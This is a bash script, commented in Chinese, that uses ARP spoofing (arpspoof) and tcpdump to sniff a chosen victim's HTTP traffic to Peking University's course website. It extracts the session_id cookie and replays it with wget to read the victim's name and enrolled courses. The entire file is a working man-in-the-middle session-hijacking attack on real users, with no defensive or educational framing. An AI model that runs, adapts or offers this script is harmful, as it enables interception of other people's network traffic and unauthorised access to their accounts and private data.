#! /bin/bash
# 作用: 对指定ip的北大课程网进行cookie截获, 进而获取课程信息
# 参数: sudo course.sh [interface] [dst_ip] [route_ip]
# 输出: 第一行输出用户姓名, 其余行输出所选的课程名

if [ $# -ne 3 ]; then
	exit 1;
fi

# 命名管道: 作用是将tcpdump的输出重定向为本脚本的输入
fifo=`mktemp --suffix=.fifo -u -p ./`;
mkfifo $fifo;
# arpspoof命令用于arp欺骗
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
tcpdump -Xvv -i $1 -s 512 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &

# 通过命名管道将命令输入和脚本输出连起来
exec 0< $fifo;
# 从tcpdump的输出中每次处理一行
while read line; do
	if [ -z "$flag" ]; then
		flag=`echo $line | grep "webapps/portal/frameset.jsp"`;
		if [ -z "$flag" ]; then
			continue;
		fi
	fi
	# 如果已经登陆到course内部页面, 则截获cookie
	cookie=`echo $line | grep -a -oP "(?<=Set-Cookie: session_id=)[0-9a-zA-Z]+"`;
	if [ -n "$cookie" ]; then
		break;
	fi
done

# 杀死后台进程并删除命名管道 
# jobs -pr | xargs -I {} kill -9 {} 1>/dev/null 2>/dev/null;
rm $fifo;

if [ -z $cookie ]; then
	exit 1;
fi

# 通过所截获的cookie登陆北大课程网, 获取用户信息和所选课程
url='http://course.pku.edu.cn/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_3_1';
wget --header "Cookie: session_id=$cookie" -O - -q -c $url | grep -oP "(?<=<title>)[^<]+";

url='http://course.pku.edu.cn/webapps/portal/execute/tabs/tabAction?action=refreshAjaxModule&modId=_4_1&tabId=_1_1&tab_tab_group_id=_3_1';
wget --header "Cookie: session_id=$cookie" -O - -q -c $url | grep -P "<a href=\"\s*/webapps/portal/frameset\.jsp\?tab_tab_group_id[^>]+>[^<]+</a>" | sed -e "s/<[^>]*>/\n/g" | sed -e "/^$/d";
